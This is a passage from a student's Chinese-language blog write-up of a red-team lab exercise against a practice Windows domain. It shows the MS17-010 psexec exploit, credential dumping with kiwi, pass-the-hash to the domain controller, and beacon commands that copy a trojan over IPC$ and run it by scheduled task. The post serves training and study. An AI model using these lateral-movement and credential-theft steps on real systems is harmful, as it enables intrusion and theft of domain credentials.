+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/25.png" class="">
+
+<p>最后试了三次才成功,实战中不推荐这种方式,太狗血了.</p>
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/26.png" class="">
+
+<p>因为这里的不稳定性,我决定把msf上win7的shell反弹给cs,通过cs的一些工具在尝试获取一下域控的权限</p>
+<p>先把公网服务器上线到cs,然后反弹shell给cs msf和cs互动请参考文章:<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1785155">https://cloud.tencent.com/developer/article/1785155</a></p>
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/27.png" class="">
+
+<p>上线成功</p>
+<p>部分信息之前在msf的shell中已经收集过了</p>
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/28.png" class="">
+
+<p>域名为 god</p>
+<p>域中有三台主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stu1.god.org  192.168.148.128(控制的这台win 7)</span><br><span class="line"></span><br><span class="line">root-tvi862ubeh.god.org  192.168.148.130</span><br><span class="line"></span><br><span class="line">owa.god.org  192.168.148.129 为域控</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域用户有 : ligang , liukaifeng01 ,administrator</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域管理员只有一个： administrator</span><br></pre></td></tr></table></figure>
+
+<p>密码也通过kiwi模块扫出来了</p>
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/29.png" class="">
+
+<p>前面我们已经通过收集信息得知DC是192.168.148.129这台机器,可以直接想办法拿到域控,因为前面已经通过hashdump和logonpassword命令获取到了域管理员的密码hash和铭文,我直接借助psexec票据传递尝试去拿域控的权限</p>
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/30.png" class="">
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/31.png" class="">
+
+<p>成功的获取到了域控的shell,通过同样的方式拿到域内另外一台机器的shell</p>
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/32.png" class="">
+
+<p>最后三台服务器都成功拿到了权限,这里同样可以通过msf的自带的psexec模块进行hash碰撞攻击.</p>
+<h6 id="IPCIPC-amp-amp-计划任务上传木马"><a href="#IPCIPC-amp-amp-计划任务上传木马" class="headerlink" title="IPCIPC$&amp;&amp;计划任务上传木马"></a>IPCIPC$&amp;&amp;计划任务上传木马</h6><p>也可以通过IPC$&amp;&amp;计划任务通过cs上传木马到跳板机win7,让跳板机尝试通过IPC服务连接到域控,将木马上传到域控的共享文件夹下面.</p>
+<p>和上面一样先开启监听然后生成木马,上面得知域控开启了IPC对应的服务端口139.</p>
+<p>通过cs与win7的会话尝试连接域控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell net use \\192.168.148.129\ipc$ /user:&quot;用户名&quot; &quot;密码&quot;</span><br><span class="line">beacon&gt; shell net view \\192.168.148.129 </span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/33.png" class="">
+
+<p>这里成功连接上域控的IPC资源共享服务</p>
+<p>查看域控的C盘文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell dir \\192.168.148.129\c$</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/34.png" class="">
+
+<p>先将本地木马上传到win7,然后通过win7上传到域控内</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell copy tiaoban.exe \\192.168.148.129\C$</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/35.png" class="">
+
+<p>上传成功</p>
+<p>创建计划任务并执行</p>
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/36.png" class="">
+
+<h5 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h5><p>同样的这里还有两种猜想思路:①信息收集发现域内存在一台krbtgt开头的域内用户,后面百度得知,该用户是kerberos生成的用户,专门为认证后的用户发放票据的,可以利用他进行随意伪造用户票据登录.</p>
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/37.png" class="">
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/38.png" class="">
+
+<p>可以看到这台计算机可以选择登录到域或者直接在本地计算机登录,这里我们拿到的是普通用户的域权限时,可以先绕过域通过本地的管理员账户登陆本地计算机然后远程上传kiwi程序,对内存的密码进行提取在用psexec进行登录.</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91/" rel="tag"><i class="fa fa-tags"></i> 内网</a>
+              <a href="/tags/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tags"></i> 日志注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/12/26/sql%E6%B3%A8%E5%85%A5/" rel="prev" title="sql注入学习">
+      <i class="fa fa-chevron-left"></i> sql注入学习
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">红队靶机一练习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E6%B8%97%E9%80%8F"><span class="nav-number">1.1.</span> <span class="nav-text">前渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.1.</span> <span class="nav-text">信息收集:</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.</span> <span class="nav-text">后渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%81%E7%A7%BB%E6%9C%A8%E9%A9%AC%E8%BF%9B%E7%A8%8B"><span class="nav-number">1.2.1.</span> <span class="nav-text">迁移木马进程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E6%9C%89%E6%9D%80%E8%BD%AF"><span class="nav-number">1.2.2.</span> <span class="nav-text">查看是否有杀软</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E6%89%93%E7%9A%84%E6%9C%89%E4%BB%80%E4%B9%88%E8%A1%A5%E4%B8%81%E6%96%B9%E4%BE%BF%E5%90%8E%E7%BB%AD%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.3.</span> <span class="nav-text">查看系统详细信息打的有什么补丁方便后续渗透</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%98%E5%9C%A8%E5%9F%9Fgod"><span class="nav-number">1.2.4.</span> <span class="nav-text">存在域god</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%EF%BC%88%E9%80%9A%E5%B8%B8%E5%8C%85%E5%90%AB%E5%9F%9F%E7%94%A8%E6%88%B7%EF%BC%89%E4%BF%A1%E6%81%AF"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">获取本地管理员（通常包含域用户）信息</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">模块爆破密码</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#kali%E6%8C%82%E4%BB%A3%E7%90%86%E9%80%9A%E5%86%85%E7%BD%91%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.5.</span> <span class="nav-text">kali挂代理通内网进行渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Kali%E5%B0%86%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8ip%E5%8A%A0%E8%BD%AC%E5%8F%91%E7%AB%AF%E5%8F%A3%E5%8A%A0%E5%85%A5%E5%88%B0%E4%BB%A3%E7%90%86%E9%93%BE%E4%B8%AD"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">Kali将公网服务器ip加转发端口加入到代理链中</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#IPCIPC-amp-amp-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">IPCIPC$&amp;&amp;计划任务上传木马</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.6.</span> <span class="nav-text">其他思路</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Bo Li"
+      src="/images/weixin.jpg">
+  <p class="site-author-name" itemprop="name">Bo Li</p>
+  <div class="site-description" itemprop="description">I am a computer student at school. This is my first blog. I will use it to record my training notes and learning contents. Welcome to visit and exchange learning</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Studying-bo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Studying-bo" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_45729615?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45729615?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.yuque.com/emtanling" title="https:&#x2F;&#x2F;www.yuque.com&#x2F;emtanling" rel="noopener" target="_blank">大佬博客</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bo Li</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+    <script defer src="/lib/three/canvas_sphere.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/haruto.model.json"},"display":{"position":"right","width":300,"height":500,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
